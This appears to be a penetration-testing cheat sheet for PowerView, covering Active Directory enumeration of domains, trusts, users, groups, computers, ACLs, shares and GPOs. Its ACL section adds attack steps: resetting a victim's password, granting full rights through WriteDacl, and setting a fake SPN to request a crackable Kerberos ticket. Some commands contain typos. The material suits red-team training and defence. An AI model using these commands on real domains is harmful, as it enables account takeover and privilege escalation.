# Powerview

## Domain

{% hint style="warning" %}
All of these commands must be used in the context of an already joined domain machine.
{% endhint %}

{% hint style="info" %}
Powerview Dev Branch can be downloaded using

**git clone** [**https://github.com/PowerShellMafia/PowerSploit**](https://github.com/PowerShellMafia/PowerSploit) **-b dev**
{% endhint %}

### Domain Info

```csharp
Get-NetDomain
Get-NetDomain -Domain crook.badcorp.local
```

![](<../../../../.gitbook/assets/image (77).png>)

### Domain Controller

```csharp
Get-NetDomainController
```

### Domain Policies

```csharp
Get-DomainPolicy
(Get-DomainPolicy)."system access"
```

![](<../../../../.gitbook/assets/image (288).png>)

### Domain Trust

```csharp
Get-NetDomainTrust
```

![](<../../../../.gitbook/assets/image (49) (1).png>)

```csharp
Get-NetForestDomain
```

![](<../../../../.gitbook/assets/image (115).png>)

```
Get-NetDomainTrust
Get-NetForestDomain
```

### Forest Mapping

```csharp
Get-NetForestCatalog
Get-NetForestTrust
Get-NetForestDomain -Verbose | Get-NetDomainTrust
Get-NetForestDomain | Get-NetDomainTrust |? {$_.trusttype -eq  "external"}
```

## Users

### Users info

```csharp
Get-NetUser | select cn
```

![](<../../../../.gitbook/assets/image (174).png>)

```csharp
Get-NetUser -UserName REX_ARMSTRONG
```

![](<../../../../.gitbook/assets/image (129) (1).png>)

### Users Proprieties

```csharp
Get-UserProperty -Properties pwdlastset
```

![](<../../../../.gitbook/assets/image (4) (1).png>)

### Users Fields

```csharp
Find-UserField -SearchField Description -SearchTerm "*built*"
```

![](<../../../../.gitbook/assets/image (169).png>)

### Logged user

{% hint style="warning" %}
Need admin privileges on the target
{% endhint %}

```csharp
 Get-NetLoggedon -ComputerName helpdesk
```

![](<../../../../.gitbook/assets/image (63).png>)

## Foreign users

```csharp
Get-DomainForeignGroupMember -Verbose -Domain domain.com
Get-ADObject -Domain domain.com   | ?{$_.objectsid -eq 'S-1-5-21-<SID Object>'}
```

```csharp
Get-DomainForeignUser -domain <domain>
```

## Groups

### Groups info

```csharp
Get-NetGroup -Domain crook.badcorp.local
```

![](<../../../../.gitbook/assets/image (109).png>)

```csharp
Get-NetGroup  "*Admin*"
Get-NetGroup  "DnsAdmins"  -FullData
```

![](<../../../../.gitbook/assets/image (17).png>)

```csharp
Get-NetGroup -domain moneycorp.local -GroupName "Domain Admins" -FullData
Get-Nt-NetGroupMember -Domain crook.badcorp.local -GroupName "Enterprise Admins"
```

### Recursive groups&#x20;

```csharp
Get-NetGroupMember -GroupName "Administrators" -Recurse
```

![](<../../../../.gitbook/assets/image (127).png>)

## Domain Computers

### Domain computers info

```csharp
Get-NetComputer -FullData | more
```

![](<../../../../.gitbook/assets/image (186).png>)

```csharp
Get-NetComputer -OperatingSystem "*Server*"
```

![](<../../../../.gitbook/assets/image (75).png>)

## ACE&#x20;

{% hint style="info" %}
DACL = Discretionary Access ControlList\
DACL composed of a serie of Access Control Entries (ACE)\
ACE are stored into a SecurityDescriptor Definition Language (SDDL)\
\
\- SDDL prototype\
\
**ace\_type;ace\_flags;rights;object\_guid;inherit\_object\_guid;account\_sid**\
\
Ex:\
\
**(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)**\
\
AceType:\
**A = ACCESS\_ALLOWED\_ACE\_TYPE**\
\
**Access rights:**\
**RP = ADS\_RIGHT\_DS\_READ\_PROP**\
**WP = ADS\_RIGHT\_DS\_WRITE\_PROP**\
**CC = ADS\_RIGHT\_DS\_CREATE\_CHILD**\
**DC = ADS\_RIGHT\_DS\_DELETE\_CHILD**\
**LC = ADS\_RIGHT\_ACTRL\_DS\_LIST**\
**SW = ADS\_RIGHT\_DS\_SELF**\
**RC = READ\_CONTROL**\
**WD = WRITE\_DAC**\
**WO = WRITE\_OWNER**\
**GA = GENERIC\_ALL**\
\
**Ace Sid:S-1-1-0**
{% endhint %}

### Powerview and related right&#x20;

![](<../../../../.gitbook/assets/image (136).png>)

### ACE Enumeration&#x20;

### Filter by user

{% hint style="warning" %}
The following command can be used on a specific child domain(...) and can be used to quickly filter specific field :&#x20;

```
 select Identity, ObjectDN,ActiveDirectoryRights | ft
```
{% endhint %}

```csharp
Get-DomainUser -domain <domain.com> | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} |  Where-Object {$_.ActiveDirectoryRights -like "*Generic*" } | select Identity, ObjectDN,ActiveDirectoryRights | ft
```

```csharp
Get-ObjectAcl -Identity ted -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

```csharp
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_} | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

#### For a computer

```csharp
Get-DomainComputer -domain domain.com | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}  | select identity,ObjectDN,ActiveDirectoryRights | ft | Out-File test.txt
```

### GenericAll&#x20;

* change password, force password reset and so on. Full control on the object

```csharp
net user victim password /domain
```

### WriteDacl

{% hint style="info" %}
Allow to modify the DACL itself. Allow to apply additional access rights such as GenericAll, GenericWrite, or even DCSync .
{% endhint %}

* Grant Generic all on OwnedService account using the WriteDacl.

```csharp
Add-DomainObjectAcl -TargetIdentity <OwnedObject> -PrincipalIdentity <myuser> -Rights All
```

### GenericWrite

```csharp
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} |  Where-Object {$_.ActiveDirectoryRights -like "*GenericWrite*" }
```

#### Set up a ServicePrincipal name on the target account&#x20;

```csharp
Set-DomainObject -Identity ownedservice -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
$User = Get-DomainUser iwnedservice
$User | Get-DomainSPNTicket | fl
```

![](<../../../../.gitbook/assets/image (10) (1).png>)

```
```

![](<../../../../.gitbook/assets/image (274).png>)

## Shares

### Find shares

```csharp
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
```

![](<../../../../.gitbook/assets/image (33).png>)

## GPO

### GPO enum

```csharp
Get-NetGPO | select displayname
# Restricted groups
Get-NetGPOGroup -Verbose

Get-NetGPO -ComputerName <server>
```

#### Classic gpresult

```
gpresult.exe /R
```

#### GPO from OU

```csharp
(Get-NetOU *HR* -FullData).gplink
# using the result
Get-NetGPO -GPOname '{FD2B3DCB-385F-486E-A627-96C1279A99B9}'
```

```csharp
Get-NetOU -FullData
```

![](<../../../../.gitbook/assets/image (83).png>)

```csharp
Get-NetGPO -GPOname '{6AC1786C-016F-11D2-945F-00C04fB984F9}'
```

#### Get items from OU

```csharp
Get-NetOU *test* | %{Get-NetComputer -ADSPATH $_}
```

## Resources

{% embed url="https://github.com/PowerShellMafia/PowerSploit" %}
